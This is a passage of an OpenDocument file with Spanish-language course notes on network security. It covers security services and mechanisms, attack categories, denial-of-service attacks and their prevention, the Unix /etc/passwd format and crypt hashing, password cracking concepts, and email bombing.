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incipios de seguridad en las comunicaciones</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Text_20_body">La seguridad en las comunicaciones implica una serie de exigencias que se extienden al sistema de comunicaciones cuando aquellos se integran en este. <text:line-break/><text:line-break/>  Para hacer frente a las amenazas a la seguridad del sistema se definen una serie de servicios para proteger los sistemas de proceso de datos y de transferencia de información de una organización. Estos servicios hacen uso de uno o varios mecanismos de seguridad. Una clasificación útil de los servicios de seguridad es la siguiente:<text:line-break/><text:line-break/>Confidencialidad: requiere que la información sea accesible únicamente por las entidades autorizadas. La confidencialidad de datos se aplica a todos los datos intercambiados por las entidades autorizadas o tal vez a sólo porciones o segmentos seleccionados de los datos, por ejemplo mediante cifrado. La confidencialidad de flujo de tráfico protege la identidad del origen y destino(s) del mensaje, por ejemplo enviando los datos confidenciales a muchos destinos además del verdadero, así como el volumen y el momento de tráfico intercambiado, por ejemplo produciendo una cantidad de tráfico constante al añadir tráfico espurio al significativo, de forma que sean indistinguibles para un intruso. La desventaja de estos métodos es que incrementan drásticamente el volumen de tráfico intercambiado, repercutiendo negativamente en la disponibilidad del ancho de banda bajo demanda.<text:line-break/><text:line-break/>Autenticación: requiere una identificación correcta del origen del mensaje, asegurando que la entidad no es falsa. Se distinguen dos tipos: de entidad, que asegura la identidad de las entidades participantes en la comunicación, mediante biométrica (huellas dactilares, identificación de iris, etc.), tarjetas de banda magnética, contraseñas, o procedimientos similares; y de origen de información, que asegura que una unidad de información proviene de cierta entidad, siendo la firma digital el mecanismo más extendido. Si le interesa, puede leer el curso de control de acceso en Internet mediante técnicas básicas.<text:line-break/><text:line-break/>Integridad: requiere que la información sólo pueda ser modificada por las entidades autorizadas. La modificación incluye escritura, cambio, borrado, creación y reactuación de los mensajes transmitidos. La integridad de datos asegura que los datos recibidos no han sido modificados de ninguna manera, por ejemplo mediante un hash criptográfico con firma, mientras que la integridad de secuencia de datos asegura que la secuencia de los bloques o unidades de datos recibidas no ha sido alterada y que no hay unidades repetidas o perdidas, por ejemplo mediante time-stamps.<text:line-break/><text:line-break/>No repudio: ofrece protección a un usuario frente a que otro usuario niegue posteriormente que en realidad se realizó cierta comunicación. Esta protección se efectúa por medio de una colección de evidencias irrefutables que permitirán la resolución de cualquier disputa. El no repudio de origen protege al receptor de que el emisor niegue haber enviado el mensaje, mientras que el no repudio de recepción protege al emisor de que el receptor niegue haber recibido el mensaje. Las firmas digitales constituyen el mecanismo más empleado para este fin.<text:line-break/><text:line-break/>Control de acceso: requiere que el acceso a los recursos (información, capacidad de cálculo, nodos de comunicaciones, entidades físicas, etc.) sea controlado y limitado por el sistema destino, mediante el <text:soft-page-break/>uso de contraseñas o llaves hardware, por ejemplo, protegiéndolos frente a usos no autorizados o manipulación.<text:line-break/><text:line-break/>Disponibilidad: requiere que los recursos del sistema informático estén disponibles a las entidades autorizadas cuando los necesiten.<text:line-break/><text:line-break/><text:span text:style-name="Strong_20_Emphasis">Mecanismos de seguridad</text:span><text:line-break/><text:line-break/>No existe un único mecanismo capaz de proveer todos los servicios anteriormente citados, pero la mayoría de ellos hacen uso de técnicas criptográficas basadas en el cifrado de la información. Los más importantes son los siguientes:<text:line-break/><text:line-break/><text:span text:style-name="Strong_20_Emphasis">Intercambio de autenticación</text:span>: corrobora que una entidad, ya sea origen o destino de la información, es la deseada, por ejemplo, A envía un número aleatorio cifrado con la clave pública de B, B lo descifra con su clave privada y se lo reenvía a A, demostrando así que es quien pretende ser. Por supuesto, hay que ser cuidadoso a la hora de diseñar estos protocolos, ya que existen ataques para desbaratarlos.<text:line-break/><text:line-break/><text:span text:style-name="Strong_20_Emphasis">Cifrado</text:span>: garantiza que la información no es inteligible para individuos, entidades o procesos no autorizados (confidencialidad). Consiste en transformar un texto en claro mediante un proceso de cifrado en un texto cifrado, gracias a una información secreta o clave de cifrado. Cuando se emplea la misma clave en las operaciones de cifrado y descifrado, se dice que el criptosistema es simétrico. Estos sistemas son mucho más rápidos que los de clave pública, resultando apropiados para funciones de cifrado de grandes volúmenes de datos. Se pueden dividir en dos categorías: cifradores de bloque, que cifran los datos en bloques de tamaño fijo (típicamente bloques de 64 bits), y cifradores en flujo, que trabajan sobre flujos continuos de bits. Cuando se utiliza una pareja de claves para separar los procesos de cifrado y descifrado, se dice que el criptosistema es asimétrico o de clave pública. Una clave, la privada, se mantiene secreta, mientras que la segunda clave, la pública, puede ser conocida por todos. De forma general, las claves públicas se utilizan para cifrar y las privadas, para descifrar. El sistema tiene la propiedad de que a partir del conocimiento de la clave pública no es posible determinar la clave privada. Los criptosistemas de clave pública, aunque más lentos que los simétricos, resultan adecuados para las funciones de autenticación, distribución de claves y firmas digitales.<text:line-break/><text:line-break/><text:span text:style-name="Strong_20_Emphasis">Integridad de datos</text:span>: este mecanismo implica el cifrado de una cadena comprimida de datos a transmitir, llamada generalmente valor de comprobación de integridad (Integrity Check Value o ICV). Este mensaje se envía al receptor junto con los datos ordinarios. El receptor repite la compresión y el cifrado posterior de los datos y compara el resultado obtenido con el que le llega, para verificar que los datos no han sido modificados.<text:line-break/><text:line-break/><text:span text:style-name="Strong_20_Emphasis">Firma digital</text:span>: este mecanismo implica el cifrado, por medio de la clave secreta del emisor, de una cadena comprimida de datos que se va a transferir. La firma digital se envía junto con los datos ordinarios. Este mensaje se procesa en el receptor, para verificar su integridad. Juega un papel esencial en el servicio de no repudio.<text:line-break/><text:soft-page-break/><text:line-break/><text:span text:style-name="Strong_20_Emphasis">Control de acceso</text:span>: esfuerzo para que sólo aquellos usuarios autorizados accedan a los recursos del sistema o a la red, como por ejemplo mediante las contraseñas de acceso.<text:line-break/><text:line-break/><text:span text:style-name="Strong_20_Emphasis">Tráfico de relleno</text:span>: consiste en enviar tráfico espurio junto con los datos válidos para que el atacante no sepa si se está enviando información, ni qué cantidad de datos útiles se está transmitiendo.<text:line-break/><text:line-break/><text:span text:style-name="Strong_20_Emphasis">Control de encaminamiento</text:span>: permite enviar determinada información por determinadas zonas consideradas clasificadas. Asimismo posibilita solicitar otras rutas, en caso que se detecten persistentes violaciones de integridad en una ruta determinada.<text:line-break/><text:line-break/><text:span text:style-name="Strong_20_Emphasis">Unicidad</text:span>: consiste en añadir a los datos un número de secuencia, la fecha y hora, un número aleatorio, o alguna combinación de los anteriores, que se incluyen en la firma digital o integridad de datos. De esta forma se evitan amenazas como la reactuación o resecuenciación de mensajes.<text:line-break/><text:line-break/>Los mecanismos básicos pueden agruparse de varias formas para proporcionar los servicios previamente mencionados. Conviene resaltar que los mecanismos poseen tres componentes principales:<text:line-break/><text:line-break/>Una información secreta, como claves y contraseñas, conocidas por las entidades autorizadas.<text:line-break/><text:line-break/>Un conjunto de algoritmos, para llevar a cabo el cifrado, descifrado, hash y generación de números aleatorios.<text:line-break/><text:line-break/>Un conjunto de procedimientos, que definen cómo se usarán los algoritmos, quién envía qué a quién y cuándo.<text:line-break/><text:line-break/>Asimismo es importante notar que los sistemas de seguridad requieren una gestión de seguridad. La gestión comprende dos campos bien amplios:<text:line-break/><text:line-break/>Seguridad en la generación, localización y distribución de la información secreta, de modo que sólo pueda ser accedida por aquellas entidades autorizadas.<text:line-break/><text:line-break/>La política de los servicios y mecanismos de seguridad para detectar infracciones de seguridad y emprender acciones correctivas.<text:line-break/><text:line-break/><text:span text:style-name="Strong_20_Emphasis">Principales vulnerabilidades y amenazas</text:span><text:line-break/><text:line-break/>Se entiende por amenaza una condición del entorno del sistema de información (persona, máquina, suceso o idea) que, dada una oportunidad, podría dar lugar a que se produjese una violación de la seguridad (confidencialidad, integridad, disponibilidad o uso legítimo). La política de seguridad y el análisis de riesgos habrán identificado las amenazas que han de ser contrarrestadas, dependiendo del diseñador del sistema de seguridad especificar los servicios y mecanismos de seguridad necesarios.<text:line-break/><text:soft-page-break/><text:line-break/>Las amenazas a la seguridad en una red pueden caracterizarse modelando el sistema como un flujo de información desde una fuente, como por ejemplo un fichero o una región de la memoria principal, a un destino, como por ejemplo otro fichero o un usuario. Un ataque no es más que la realización de una amenaza.<text:line-break/><text:line-break/>Las cuatro categorías generales de amenazas o ataques son las siguientes:<text:line-break/><text:line-break/>Interrupción: un recurso del sistema es destruido o se vuelve no disponible. Este es un ataque contra la disponibilidad. Ejemplos de este ataque son la destrucción de un elemento hardware, como un disco duro, cortar una línea de comunicación o deshabilitar el sistema de gestión de ficheros.<text:line-break/><text:line-break/>Intercepción: una entidad no autorizada consigue acceso a un recurso. Este es un ataque contra la confidencialidad. La entidad no autorizada podría ser una persona, un programa o un ordenador. Ejemplos de este ataque son pinchar una línea para hacerse con datos que circulen por la red y la copia ilícita de ficheros o programas (intercepción de datos), o bien la lectura de las cabeceras de paquetes para desvelar la identidad de uno o más de los usuarios implicados en la comunicación observada ilegalmente (intercepción de identidad).<text:line-break/><text:line-break/>Modificación: una entidad no autorizada no sólo consigue acceder a un recurso, sino que es capaz de manipularlo. Este es un ataque contra la integridad. Ejemplos de este ataque son el cambio de valores en un archivo de datos, alterar un programa para que funcione de forma diferente y modificar el contenido de mensajes que están siendo transferidos por la red.<text:bookmark text:name="_GoBack"/><text:line-break/><text:line-break/>Fabricación: una entidad no autorizada inserta objetos falsificados en el sistema. Este es un ataque contra la autenticidad. Ejemplos de este ataque son la inserción de mensajes espurios en una red o añadir registros a un archivo.<text:line-break/><text:line-break/>Estos ataques se pueden asimismo clasificar de forma útil en términos de ataques pasivos y ataques activos.<text:line-break/><text:line-break/><text:span text:style-name="Strong_20_Emphasis">Ataques pasivos</text:span><text:line-break/><text:line-break/>En los ataques pasivos el atacante no altera la comunicación, sino que únicamente la escucha o monitoriza, para obtener información que está siendo transmitida. Sus objetivos son la intercepción de datos y el análisis de tráfico, una técnica más sutil para obtener información de la comunicación, que puede consistir en:</text:p>
      <text:p text:style-name="Text_20_body">Obtención del origen y destinatario de la comunicación, leyendo las cabeceras de los paquetes monitorizados.<text:line-break/><text:line-break/>Control del volumen de tráfico intercambiado entre las entidades monitorizadas, obteniendo así información acerca de actividad o inactividad inusuales.<text:line-break/><text:soft-page-break/><text:line-break/>Control de las horas habituales de intercambio de datos entre las entidades de la comunicación, para extraer información acerca de los períodos de actividad.<text:line-break/><text:line-break/>Los ataques pasivos son muy difíciles de detectar, ya que no provocan ninguna alteración de los datos. Sin embargo, es posible evitar su éxito mediante el cifrado de la información y otros mecanismos que se verán más adelante.<text:line-break/><text:line-break/><text:span text:style-name="Strong_20_Emphasis">Ataques activos</text:span><text:line-break/><text:line-break/>Estos ataques implican algún tipo de modificación del flujo de datos transmitido o la creación de un falso flujo de datos, pudiendo subdividirse en cuatro categorías:<text:line-break/><text:line-break/>Suplantación de identidad: el intruso se hace pasar por una entidad diferente. Normalmente incluye alguna de las otras formas de ataque activo. Por ejemplo, secuencias de autenticación pueden ser capturadas y repetidas, permitiendo a una entidad no autorizada acceder a una serie de recursos privilegiados suplantando a la entidad que posee esos privilegios, como al robar la contraseña de acceso a una cuenta.<text:line-break/><text:line-break/>Reactuación: uno o varios mensajes legítimos son capturados y repetidos para producir un efecto no deseado, como por ejemplo ingresar dinero repetidas veces en una cuenta dada.<text:line-break/><text:line-break/>Modificación de mensajes: una porción del mensaje legítimo es alterada, o los mensajes son retardados o reordenados, para producir un efecto no autorizado. Por ejemplo, el mensaje “Ingresa un millón de pesetas en la cuenta A” podría ser modificado para decir “Ingresa un millón de pesetas en la cuenta B”.<text:line-break/><text:line-break/>Degradación fraudulenta del servicio: impide o inhibe el uso normal o la gestión de recursos informáticos y de comunicaciones. Por ejemplo, el intruso podría suprimir todos los mensajes dirigidos a una determinada entidad o se podría interrumpir el servicio de una red inundándola con mensajes espurios. Entre estos ataques se encuentran los de denegación de servicio, consistentes en paralizar temporalmente el servicio de un servidor de correo, Web, FTP, etc.<text:line-break/><text:line-break/><text:span text:style-name="Strong_20_Emphasis">Tipos de Ataques y Vulnerabilidades</text:span><text:line-break/><text:line-break/><text:span text:style-name="Strong_20_Emphasis">Negación de servicio ( denial of service )</text:span><text:line-break/><text:line-break/>En el presente apartado, se describirán los modos de ataques que podrían ocurrir más frecuentemente en las redes de información. Debido a la pérdida de dinero y de tiempo que estos ataques pueden ocasionar, se presentarán también algunas formas de prevención y de respuesta a los mismos.<text:line-break/><text:line-break/>¿Qué es “Denial of service”?. Descripción de ataques:<text:line-break/><text:line-break/><text:soft-page-break/>Denial of service es un tipo de ataque cuya meta fundamental es la de negar el acceso del atacado a un recurso determinado o a sus propios recursos.<text:line-break/><text:line-break/>Algunos ejemplos de este tipo de ataque son:<text:line-break/><text:line-break/>Tentativas de “floodear” (inundar) una red, evitando de esta manera el tráfico legítimo de datos en la misma.<text:line-break/><text:line-break/>Tentativas de interrumpir las conexiones entre dos máquinas evitando, de esta manera, el acceso a un servicio.<text:line-break/><text:line-break/>Tentativas de evitar que una determinada persona tenga acceso a un servicio.<text:line-break/><text:line-break/>Tentativas de interrumpir un servicio específico a un sistema o a un usuario.<text:line-break/><text:line-break/>Cabría tener en cuenta que, el uso ilegítimo de recursos puede también dar lugar a la negación de un servicio. Por ejemplo, un “hacker” puede utilizar un área del FTP anónimo como lugar para salvar archivos, consumiendo, de esta manera, espacio en el disco y generando tráfico en la red.<text:line-break/><text:line-break/>Como consecuencia, los ataques de negación de servicio pueden esencialmente dejar inoperativa una computadora o una red. De esta forma, toda una organización puede quedar fuera de Internet durante un tiempo determinado.</text:p>
      <text:p text:style-name="Text_20_body"> </text:p>
      <text:p text:style-name="Text_20_body">- Modos de ataque<text:line-break/><text:line-break/>Algunos ataques de negación de servicio se pueden ejecutar con recursos muy limitados contra un sitio grande y sofisticado. Este tipo de ataque se denomina “ataque asimétrico”. Por ejemplo, un atacante con una vieja PC y un módem puede poner fuera de combate a máquinas rápidas y sofisticadas. Ultimamente, esto es común con ataques de los denominados “nukes” en los cuales caen instalaciones grandes, por ejemplo, de clusters Windows NT.<text:line-break/><text:line-break/>Hay tres tipos de ataques básicos de negación de servicios:<text:line-break/><text:line-break/>a.- Consumo de recursos escasos, limitados, o no renovables.<text:line-break/><text:line-break/>b.- Destrucción o alteración de información de configuración.<text:line-break/><text:line-break/>c.- Destrucción o alteración física de los componentes de la red.<text:line-break/><text:line-break/>- Consumo de recursos escasos, limitados, o no renovables<text:line-break/><text:line-break/>Las computadoras y las redes necesitan para funcionar ciertos recursos: ancho de banda de la red, <text:soft-page-break/>espacio de memoria y disco, tiempo de CPU, estructuras de datos, acceso otras computadoras y redes, entre otros.<text:line-break/><text:line-break/><text:span text:style-name="Strong_20_Emphasis">Conectividad</text:span><text:line-break/><text:line-break/>Los ataques de Negación de servicio se ejecutan, con frecuencia, contra la conectividad de la red. La meta del hacker es evitar que las computadoras se comuniquen en la red.<text:line-break/><text:line-break/>Un ejemplo de este tipo de ataque es el “SYN flood”:<text:line-break/><text:line-break/>En este tipo de ataque, el hacker comienza el proceso de establecer una conexión TCP a la máquina de la víctima, pero lo hace de manera tal que evita que la conexión se complete. En este tiempo, la máquina del atacado ha reservado uno entre un número limitado de las estructuras de datos requeridas para terminar la conexión inminente. El resultado es que las conexiones legítimas se rechazan mientras que la máquina del atacado se queda esperando para terminar esas falsas conexiones “medio abiertas”.<text:line-break/><text:line-break/>Debe tenerse en cuenta que este tipo de ataque no depende del ancho de banda que disponga el atacante. En este caso, el hacker está consumiendo las estructuras de datos del kernel, implicadas en establecer una conexión TCP. Un hacker con una simple conexión dial-up puede realizar este ataque contra una poderosa Workstation (este último es un buen ejemplo de un ataque asimétrico).<text:line-break/><text:line-break/><text:span text:style-name="Strong_20_Emphasis">Aprovechamiento de los recursos del otro</text:span><text:line-break/><text:line-break/>Un hacker también puede utilizar los recursos de que la empresa dispone contra ella misma, de maneras inesperadas. Por ejemplo, el caso de Negación de servicio UDP. En este ataque, el hacker utiliza los paquetes “falsificados” de UDP para conectar el servicio de generación de eco en una máquina con el servicio de chargen en otra máquina.<text:line-break/><text:line-break/>El resultado es, que los dos servicios consumen todo el ancho de banda de red entre ellos. Así, la conectividad para todas las máquinas en la misma red desde cualquiera de las máquinas atacadas se ve afectada.<text:line-break/><text:line-break/><text:span text:style-name="Strong_20_Emphasis">Consumo de ancho de banda</text:span><text:line-break/><text:line-break/>Un hacker puede, también, consumir todo el ancho de banda disponible en la red generando una gran cantidad de paquetes dirigidos a la misma. Típicamente, estos paquetes son de generación de eco de ICMP (ping), pero pueden ser cualquier otra cosa. Además, el hacker no necesita operar desde una sola máquina; él puede poder coordinar varias máquinas en diversas redes para alcanzar el mismo efecto.<text:line-break/><text:line-break/><text:span text:style-name="Strong_20_Emphasis">Consumo de otros recursos</text:span><text:line-break/><text:line-break/>Además del ancho de banda de la red, los hackers pueden consumir otros recursos que el sistema <text:soft-page-break/>necesite para funcionar. Por ejemplo, en muchos sistemas, un número limitado de las estructuras de datos en el kernel está disponible para almacenar información de procesos (identificadores, entradas en tablas de procesos, slots , etc.).<text:line-break/><text:line-break/>Un hacker puede consumir estas estructuras de datos escribiendo un programa o un script que no haga nada pero que cree en varias ocasiones copias de sí mismo.<text:line-break/><text:line-break/>Muchos sistemas operativos modernos, aunque no la totalidad de ellos, tienen recursos para protegerse contra este problema. Además, aunque las tablas de procesos no se llenen, se consume CPU por la gran cantidad de procesos y conmutación entre los mismos.<text:line-break/><text:line-break/>Un hacker puede también consumir su espacio en disco de otras maneras, por ejemplo:<text:line-break/><text:line-break/>Generar miles de mails (Spam, Bombing. Para ampliar este tema, consultar el próximo).<text:line-break/><text:line-break/>Generar intencionalmente errores que deben ser logueados. En este tipo de ataque, podemos citar también la utilización indebida del syslog en unix. Es decir, utilizar el proceso syslog de la víctima para que registre eventos de otra máquina, llenando el espacio en disco con el archivo de syslog.<text:line-break/><text:line-break/>Colocar archivos en el disco, utilizando ftp anónimo.<text:line-break/><text:line-break/>En general, se puede utilizar cualquier cosa que permita que los datos sean escritos en el disco para ejecutar un ataque de negación de servicio si no hay límites en la cantidad de datos que se pueden escribir (quotas).<text:line-break/><text:line-break/>No obstante, muchos sitios tienen esquemas de “lockout” de cuenta después de un cierto número de logins fallados. Un setup típico bloquea el login después de 3 o 5 tentativas falladas. Un hacker puede utilizar este esquema para evitar que los usuarios legítimos entren. En algunos casos, incluso las cuentas privilegiadas, tales como root o administrator, pueden ser víctimas de este tipo de ataque.<text:line-break/><text:line-break/>Un hacker puede hacer caer el sistema o ponerlo inestable, enviando datos inesperados. Un ejemplo de tal ataque es el “ping flood” o Pings de tamaño demasiado grande. Si el sistema está experimentando caídas frecuentes sin causa evidente, podría deberse a este tipo de ataque.<text:line-break/><text:line-break/>Hay otros componentes que pueden ser vulnerables a la negación de servicio y que deben vigilarse. Estos incluyen:<text:line-break/><text:line-break/>Impresoras.<text:line-break/><text:line-break/>Unidades de cinta.<text:line-break/><text:line-break/>Conexiones de red.<text:line-break/><text:soft-page-break/><text:line-break/>- Destrucción o alteración de la información de configuración.<text:line-break/><text:line-break/>Una computadora incorrectamente configurada puede no funcionar bien o directamente no arrancar. Un hacker puede alterar o destruir la información de configuración del sistema operativo, evitando de esta forma que se use la computadora o red.<text:line-break/><text:line-break/>Veamos algunos ejemplos:<text:line-break/><text:line-break/>Si un hacker puede cambiar la información de ruteo de sus routers, la red puede ser deshabilitada.<text:line-break/><text:line-break/>Si un hacker puede modificar la registry en una máquina Windows NT, ciertas funciones pueden ser imposibles de utilizar, o directamente el sistema puede no volver a bootear.<text:line-break/><text:line-break/>- Destrucción o alteración física de los componentes de la red.<text:line-break/><text:line-break/>Es muy importante la seguridad física de la red. Se debe resguardar contra el acceso no autorizado a las computadoras, los routers, los racks de cableado de red, los segmentos del backbone de la red, y cualquier otro componente crítico de la red.<text:line-break/><text:line-break/>- Prevención y respuesta<text:line-break/><text:line-break/>Tal como se ha expresado anteriormente, los ataques de Negación de servicio pueden dar lugar a pérdidas significativas de tiempo y dinero para muchas organizaciones, por lo que se recomiendan una serie de medidas:<text:line-break/><text:line-break/>Colocar access lists en los routers. Esto reducirá su exposición a ciertos ataques de negación de servicio.<text:line-break/><text:line-break/>Instalar patches al sistema operativo contra flooding de TCP SYN. Esta acción permitirá reducir sustancialmente su exposición a estos ataques aunque no pueda eliminar el riesgo en forma definitiva.<text:line-break/><text:line-break/>Invalidar cualquier servicio de red innecesario o no utilizado. Esto puede limitar la capacidad de un hacker de aprovecharse de esos servicios para ejecutar un ataque de negación de servicio. Por ejemplo: chargen, Echo, etc.<text:line-break/><text:line-break/>Observar el funcionamiento del sistema y establecer valores base para la actividad ordinaria. Utilizar estos valores para calibrar niveles inusuales de la actividad del disco, del uso de la CPU, o del tráfico de red.<text:line-break/><text:line-break/>Implementar sistemas de cuotas para todos los login. <text:line-break/><text:line-break/><text:soft-page-break/>Incluir como parte de la rutina, un examen de la seguridad física. Considere, entre otras cosas, los servidores, routers, terminales desatendidas, ports de acceso de red y los gabinetes de cableado.<text:line-break/><text:line-break/>Utilizar Tripwire o una herramienta similar para detectar cambios en la información de configuración u otros archivos.<text:line-break/><text:line-break/>Tratar de utilizar configuraciones de red redundantes y fault-tolerant.</text:p>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="Strong_20_Emphasis">Cracking de passwords</text:span><text:line-break/><text:line-break/>En este apartado, se presentarán una serie de consideraciones referidas al “cracking de passwords” basadas en UNIX1.<text:line-break/><text:line-break/>El objetivo inicial consiste en entrar al server. Para ello, se procede como si se tratase de una máquina remota (telnet). Pero, debido a que se permite el acceso a múltiples usuarios, los sistemas UNIX nos solicitarán un nombre de identificación acompañado de una clave. Dicho nombre darse de alta en el sistema para que se pueda acceder. Cuando un usuario desea entrar en una máquina, el sistema solicitará:<text:line-break/><text:line-break/>Un login de acceso o nombre de usuario. Si el login es incorrecto, el sistema no lo notificará para impedirle conocer qué accesos se encuentran dados de alta.<text:line-break/><text:line-break/>Una password o palabra clave. Si la password coincide con la que tiene asignada el login que se emplea, el sistema permitirá el acceso.</text:p>
      <text:list xml:id="list276345899" text:style-name="L1">
        <text:list-item>
          <text:p text:style-name="P1">- El archivo “/etc/password”: descripción </text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="Text_20_body">Los usuarios que se encuentran dados de alta en el sistema, así como las passwords que emplean, se hallan localizados en el archivo: /etc/password (para la mayoría de los sistemas operativos basados en UNIX).<text:line-break/><text:line-break/>Lamentablemente para algunos, y afortunadamente para otros, este archivo es el punto más débil del sistema. Está compuesto de líneas o registros en las cuales cada línea se divide en siete campos con dos puntos (:).<text:line-break/><text:line-break/>Veamos un ejemplo:<text:line-break/><text:line-break/>kaiser:j99sE3vc23: 105:100:El Kaiser:/usr/var1:/bin/ksh<text:line-break/><text:line-break/>campo 1: kaiser<text:line-break/><text:line-break/>Es el “username”, nombre de usuario, “login” que se emplea para acceder al sistema.<text:line-break/><text:line-break/>campo 2: j99sE3vc23<text:line-break/><text:soft-page-break/><text:line-break/>Es la password encriptada.<text:line-break/><text:line-break/>Si el campo contiene un asterisco (*), indica que la cuenta no se puede utilizar. Si todos los campos poseen el asterisco u otro signo significa que las claves están en un archivo “shadow”. En caso de que esto no ocurra, significa que la cuenta no posee ninguna contraseña de acceso.<text:line-break/><text:line-break/>Dado su sistema de encriptación, una vez que el usuario introduce la password, el sistema operativo lo encripta y verifica con el que se encuentra en este archivo. En caso de que sean iguales, la password introducida es correcta.<text:line-break/><text:line-break/>Si los dos últimos caracteres de este campo van precedidos de una coma, esto indica la fecha en que expira el empleo de esta contraseña.<text:line-break/><text:line-break/>campo 3: 105<text:line-break/><text:line-break/>Es el UID, número de usuario de sistema. Puede ser de 0 a 60000. Por lo general, se comienza a partir del 100. El UID con valor 0 indica que la persona tiene nivel de “super usuario”, esto es, aquel que tiene todos los privilegios de acceso en el sistema.<text:line-break/><text:line-break/>campo 4: 100<text:line-break/><text:line-break/>Es el GID, número del grupo al que pertenece el usuario. Puede ser de 0 a 60000.<text:line-break/><text:line-break/>El 0 también se corresponde con el grupo de “super usuario” o root. Los usuarios del mismo grupo tienen el mismo nivel de privilegios para aquellos elementos que pertenezcan a su dominio.<text:line-break/><text:line-break/>campo 5: El Kaiser<text:line-break/><text:line-break/>Es el “comment”, es decir, datos personales del usuario (nombre completo, teléfono, etc.).<text:line-break/><text:line-break/>campo 6: usr/var1<text:line-break/><text:line-break/>Es el “home directory”, directorio donde se ubica al usuario. Su directorio de trabajo.<text:line-break/><text:line-break/>campo 7: /bin/ksh<text:line-break/><text:line-break/>Es el “shell” o intérprete de comandos empleado por el usuario. Depende de cuál emplee, podrá realizar determinadas acciones.<text:line-break/><text:line-break/>Unix encripta las contraseñas mediante un mecanismo del kernel, crypt. Este es un algoritmo basado en el estándar de encriptación de datos (DES) desarrollado por el Instituto Nacional de Estándares y <text:soft-page-break/>Tecnología (NIST).<text:line-break/><text:line-break/>El estándar DES transforma la información de texto plano en datos encriptados, texto cifrado, mediante el uso de un algoritmo especial y valor semilla llamado clave.<text:line-break/><text:line-break/>No debe confundirse el comando crypt(3) con el crypt(1). Este último es mucho más inseguro y está basado en el dispositivo Enigma, utilizado por las fuerzas armadas alemanas en la Segunda Guerra Mundial.<text:line-break/><text:line-break/>En crypt (3) el texto plano se encripta en un grupo de ceros. Posteriormente el texto cifrado resultante es encriptado de nuevo con la password del usuario como clave. Este proceso se repite 25 veces. Una vez finalizado los 64 bits se dividen en 11 caracteres y se guardan en el archivo /etc/passwd o se guardan en el archivo shadow.<text:line-break/><text:line-break/>También suele utilizarse lo que en criptología se denomina "grano de sal", dato de variabilidad, etc... Se trata de un valor de 12 bits que utiliza para modificar el resultado de la función DES. Es decir, un valor que puede variar de 0 a 4095. Así, para cada contraseña posible existen 4096 formas de encriptación y almacenamiento.<text:line-break/><text:line-break/>Cuando recurrimos al programa /bin/passwd para introducir una nueva contraseña, dicho programa utiliza un "grano de sal" basado en la hora del sistema.<text:line-break/><text:line-break/>Esta última es usada para la función de cálculo de la contraseña encriptada. Esta sal es guardada junto con la contraseña en el archivo /etc/passwd (en el caso de que no este instalado el soporte de shadow password). De esta forma, los dos primeros caracteres de una contraseña son en realidad el "grano de sal":<text:line-break/><text:line-break/>E67hfr83cEr23<text:line-break/><text:line-break/>E6 son el "grano de sal". Cuando ingresemos nuevamente al sistema y nos pida nuestra password el programa encriptará la palabra que le demos utilizando ese mismo "grano de sal". Posteriormente, comparará el resultado de esta encriptación con la password almacenada para comprobar si coinciden. Es decir, en ningún momento se desencripta la password. Lo que, en realidad, realiza el sistema es encriptar la palabra que le suministramos y comparar con el original.<text:line-break/><text:line-break/>- Descubrir una password<text:line-break/><text:line-break/>Una vez encriptada una password, no se puede desencriptar. Sin embargo, esto no garantiza la seguridad de la password, puesto que no significa que la password no se pueda averiguar.<text:line-break/><text:line-break/>El mecanismo que se utiliza para descubrir (no desencriptar) las passwords consiste en efectuar encriptaciones de palabras (posibles passwords) y comparar estas encriptaciones con el original.<text:line-break/><text:soft-page-break/><text:line-break/>¿De qué depende el éxito?<text:line-break/><text:line-break/>El éxito depende de la calidad del diccionario (archivo que contiene un conjunto de posibles passwords), del programa que se utilice, del CPU y, por supuesto, de nuestra paciencia.<text:line-break/><text:line-break/>Los programas buscadores de contraseñas son fácilmente diseñables.<text:line-break/><text:line-break/>Estas amenazas se producen porque existen ciertas vulnerabilidades en el sistema informático. Definimos Vulnerabilidad como debilidad de cualquier tipo que compromete la seguridad del sistema informático.<text:line-break/><text:line-break/>Si mediante un “bug” se obtiene el archivo /etc/passwd, se puede iniciar un ataque de diccionario contra el mismo obteniéndose, de este modo, las passwords.<text:line-break/><text:line-break/>Otro tipo de ataque es el de “fuerza bruta”, que consiste simplemente en realizar todas las combinaciones posibles de caracteres hasta hallar la password.<text:line-break/><text:line-break/>En el siguiente cuadro podemos ver el tiempo de búsqueda de una password de acuerdo a la longitud y tipo de caracteres utilizados. Se supone una velocidad de búsqueda de 100.000 passwords por segundo.<text:line-break/><text:line-break/>E-mail bombing y spamming<text:line-break/><text:line-break/>En este apartado, se presentarán algunas de las dificultades que pueden surgir como consecuencia de la utilización de los servicios de mail. Se brindarán, por otro lado, algunas respuestas a dichos obstáculos.</text:p>
      <text:list xml:id="list89520278" text:style-name="L2">
        <text:list-item>
          <text:p text:style-name="P2">Descripción </text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="Text_20_body">El e-mail bombing consiste en enviar muchas veces un mensaje idéntico a una misma dirección, saturando el mailbox del destinatario.</text:p>
      <text:p text:style-name="Text_20_body">El spamming, que es una variante del e-mail bombing, se refiere a enviar el email a centenares o millares de usuarios e, inclusive, a listas de interés. El Spamming puede resultar aún más perjudicial si los destinatarios contestan el mail, haciendo que todos reciban la respuesta.<text:line-break/><text:line-break/>Puede, además, ocurrir inocentemente como resultado de enviar un mensaje a la lista y no darse cuenta de que la lista lo distribuye a millares de usuarios, o como resultado de mala configuración de un autorespondedor, por ejemplo el “vacation”.<text:line-break/><text:line-break/>El e-mail bombing/spamming se puede combinar con el e-mail spoofing – que altera la identidad de la cuenta que envía el mail -, logrando que sea más difícil determinar quién está enviando realmente el mail.<text:line-break/><text:line-break/>- Detalles técnicos<text:line-break/><text:soft-page-break/><text:line-break/>Cuando se proveen los servicios de e-mail los usuarios son, lógicamente, vulnerables al e-mail bombing y spamming.<text:line-break/><text:line-break/>En efecto, el e-mail spamming es casi imposible de prevenir. Un usuario con una dirección válida de mail puede realizar " Spam " a cualquier otra dirección de mail, newsgroup, o sistema de BBS.<text:line-break/><text:line-break/>Cuando gran cantidad de mails son dirigidos a un solo sitio, éste puede sufrir “denial of service” por pérdida de conectividad, caerse el sistema o producirse fallas en el servicio debido a:<text:line-break/><text:line-break/>sobrecarga de conexiones de red;<text:line-break/><text:line-break/>utilización de todos los recursos de sistema disponibles;<text:line-break/><text:line-break/>llenado del 